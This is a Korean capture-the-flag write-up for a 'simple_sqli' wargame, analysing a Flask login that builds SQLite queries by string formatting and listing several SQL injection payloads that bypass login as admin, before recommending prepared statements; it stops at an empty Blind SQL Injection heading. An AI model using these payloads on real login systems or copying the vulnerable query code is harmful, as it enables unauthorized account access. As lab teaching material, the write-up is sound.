# 배경 지식

이번 문제는 `SQLite`를 이용하여 데이터베이스를 관리하고 있다.

[SQLite](https://www.sqlite.org/index.html)는 기존에 잘 알려진 `MySQL`, `MSSQL`, `Oracle` 등과 유사한 형태의 **DBMS**이다.

SQLite는 데이터 관리를 위한 일부 필수 기능만을 지원하기 때문에, 다른 DBMS에 비해 **비교적 경량화된** DBMS로 널리 알려져 있다.

따라서 SQLite는 많은 양의 컴퓨팅 리소스를 제공하기 어려운 임베디드 장비, 비교적 복잡하지 않은 독립실행향(Standalone) 프로그램에서 사용되며, 개발 단계의 편의성 또는 프로그램의 안전성을 제공한다.

## 문제 목표 및 기능 요약

`simple_sqli` 워게임의 목표는 관리자 계정으로 로그인하면 출력되는 `FLAG`를 획득하는 것이다. 워게임 사이트를 통해 서버에 접속해보면 간단한 로그인 기능만이 존재한다.

<img width="1016" alt="image" src="https://github.com/user-attachments/assets/5b34b38f-97f2-472b-9766-e1d23867db20">

|기능명|설명|
|-|-|
|`/login`|입력받은 ID/PW를 데이터베이스에서 조회하고 이에 해당하는 데이터가 있는 경우 로그인을 수행합니다.|

# 웹 서비스 분석

## 데이터베이스 스키마

```
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우,
    db = sqlite3.connect(DATABASE) # 데이터베이스 파일 생성 및 연결
    db.execute('create table users(userid char(100), userpassword char(100));') # users 테이블 생성
    # users 테이블에 guest와 admin 계정(row) 생성
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    db.close() # DB 연결 종료
```

데이터베이스는 해당 `schema`를 통해 `database.db` 파일로 관리하고 있다.

위 코드를 살펴보면, 데이터 베이스 구조는 아래와 같다.

|users||
|-|-|
|`userid`|`userpassword`|
|guest|guest|
|admin|랜덤 16바이트 문자열을 Hex 형태로 표현 (32바이트)|

**`CREATE`를 통해** `userid`와 `userpassword` 칼럼을 가지는 `users` **테이블**을 생성해주고, **`INSERT`를 통해** 두 개의 **행**을 만들어준다.

여기서, `userid`가 `"admin"`인 행의 `userpassword`는 랜덤화된 데이터이기 때문에 SQL Injection을 사용하지 않고는 임의로 알아낼 수 없다.

## 엔드포인트 : `/login`

```
# Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함
@app.route('/login', methods=['GET', 'POST'])
def login():
    # 이용자가 GET 메소드의 요청을 전달한 경우,
    if request.method == 'GET':
        return render_template('login.html') # 이용자에게 ID/PW를 요청받는 화면을 출력
    # POST 요청을 전달한 경우
    else:
        userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
        userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
        res = query_db(
            f'select * from users where userid="{userid}" and userpassword="{userpassword}"'
        )

        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용

            if userid == 'admin': # 이 때, 로그인 계정이 관리자 계정인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력

            # 관리자 계정이 아닌 경우, 웰컴 메시지만 출력
            return f'<script>alert("hello {userid}");history.go(-1);</script>'

        # 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력
        return '<script>alert("wrong");history.go(-1);</script>'
```

### GET

제일 처음에 본 `userid`와 `userpassword`를 입력할 수 있는 로그인 페이지를 제공한다.

### POST

`form`을 통해 제출된 `userid`와 `userpassword`를 저장한 후, `query_db` 함수에 `f-string`을 통해 저장한 `userid`와 `userpassword`를 넣어준 후 함수를 호출하여 `res`에 리턴 값을 저장한다.

`query_db` 함수는 아래와 같다.

```
def query_db(query, one=True): # query_db 함수 선언
    cur = get_db().execute(query) # 연결된 데이터베이스에 쿼리문을 질의
    rv = cur.fetchall() # 쿼리문 내용을 받아오기
    cur.close() # 데이터베이스 연결 종료
    return (rv[0] if rv else None) if one else rv # 쿼리문 질의 내용에 대한 결과를 반환

```

해당 함수를 호출하면, 데이터베이스에 인자로 전달한 쿼리문을 날리고, 쿼리문에 대한 응답을 `rv`에 저장한다.

`rv`는 쿼리문에 대한 응답을 저장하는 결과 리스트이며, 각 행이 `tuple` 형태로 저장된다. 

이번 문제에서는 `SELECT` 쿼리를 통해 테이블에서 특정 조건을 만족하는 행을 가져오는데, 로그인에서 가져오는 행은 1개이기 때문에 `one=True` 파라미터를 통해 **첫 번째 행**인 `rv[0]`을 가져오도록 하였다. (로그인이 실패하면 `rv`는 `None`일 것이다.)

여기서 `query_db`의 리턴 값이 `None`이 아니어서, `res`에 리턴 값(`rv[0]`)이 존재한다면, **해당 행의 첫 번째 컬럼에 저장된 값**인 `userid` 값을 `res[0]`을 통해 가져온다.

`userid`가 만약 `admin`이라면 `FLAG`를 출력하고, 아니라면 `hello {userid}`만 출력한다.

# 취약점 분석

해당 워게임에서 `query_db`에 쿼리문 인자를 전달할 때, `form`을 통해 이용자에게 입력 받은 `userid`와 `userpassword` 값을 쿼리문 내부에 포함하여 전달한다.

이렇게 동적으로 생성된 쿼리를 `RawQuery`라고 하는데, `RawQuery`를 생성할 때, **이용자의 입력 값이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있다고 하였다.**

이용자의 입력 값이 SQL Injection에 사용되는 SQL 쿼리문으로 해석될 수 있는지 검사하는 과정이 없기 때문에, `userid` 또는 `userpassword`에 공격자가 원하는 쿼리문이 실행되도록 쿼리문을 삽입하여 SQL Injection 공격을 수행할 수 있다.

SQL Injection으로 로그인 인증을 우회하여 로그인만 하는 방법이 있고, Blind SQL Injection을 통해 비밀번호를 알아낼 수 있는 방법도 존재한다.

## 1. SQL Injection

`userid`의 입력 값을 통해 쿼리문을 조작하여 `admin` 계정으로 로그인할 수 있도록, `query_db` 함수의 `rv[0]` 값이 `admin` 계정을 나타내는 행을 리턴하는 다양한 공격문을 아래와 같이 작성해볼 수 있다.

---

`userid` : `admin" --` 입력, 

`userpassword` : 아무 `random` 값이나 입력 

- `select * from users where userid="admin" --" and userpassword="random"`

---

`userid` : `admin" or 1"` 입력

`userpassword` : `random`

- `select * from users where userid="admin" or "1" and userpassword="random"`

참고로 주의할 점이, `userid`에 `admin" or 1 --`을 입력하면, 항상 참이 되어 모든 행을 가져오는데, `guest`가 테이블에서 첫 번째 행이므로 `rv[0]`이 `guest`를 리턴해서 `hello guest`가 출력된다.

`select * from users where userid="admin" or "1" and userpassword="random"`은 `select * from users where userid="admin" or userpassword="random"`으로 연산자 우선 순위에 의해 바뀌기 때문에 `"admin"`계정의 행이 리턴되게 된다.\
(`and` 연산자의 우선 순위가 `or`보다 높아서 `("1" and userpassword="random")`가 먼저 계산되어 `userpassword="random"`으로 합쳐지기 때문)

---

`userid` : `random` 입력

`userpassword` : `random" or userid="admin` 입력

- `select * from users where userid="random" AND userpassword="random" or userid="admin"`

앞에서 설명한 연산자 우선 순위에 의해 `AND` 부분부터 연산되는데, 해당 결과는 `FALSE`이므로 결국 `userid="admin"`인 행만 리턴하게 된다.

---

`userid` : `random` 입력

`userpassword` : `random" or 1 LIMIT 1, 1 --` 입력

- `select * from users where userid="random" or 1 LIMIT 1,1--" and userpassword="random"`

앞에서 설명한 것처럼, `or 1`에 의해 테이블의 행이 전부 리턴되면, 첫 번째 행에는 `guest`가 존재하고 두 번째 행에는 `admin`이 존재하기 떄문에 `LIMIT 1, 1`으로 두 번째 행을 반환하도록 설정하면 된다.

`LIMIT`의 첫 번째 인자는 `시작 인덱스`이고, 두 번째 인자는 `리턴할 행의 개수`이다. (`0-index`)

---

이렇게 여러 쿼리문을 통해 SQL Injection 공격을 수행하면 아래와 같이 `FLAG`를 `return` 하여 출력하게 된다.

<img width="504" alt="image" src="https://github.com/user-attachments/assets/bcb7e330-17ee-4624-bd44-a43bb01e5991">

`simple_sqli` 문제를 통해 **이용자의 입력값이 실행할 쿼리문에 포함될 경우** 발생할 수 있는 취약점에 대해서 알아보았다.

이러한 문제점은 이용자의 입력값이 포함된 쿼리를 동적으로 생성하고 사용하면서 발생한다.

따라서 SQL 데이터를 처리할 때 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**와 **Object Relational Mapping (ORM)** 을 사용해 취약점을 보완할 수 있습니다.

**Prepared Statement**는 동적 쿼리가 전달되면 내부적으로 쿼리 분석을 수행해 안전한 쿼리문을 생성한다.

## 2. Blind SQL Injection
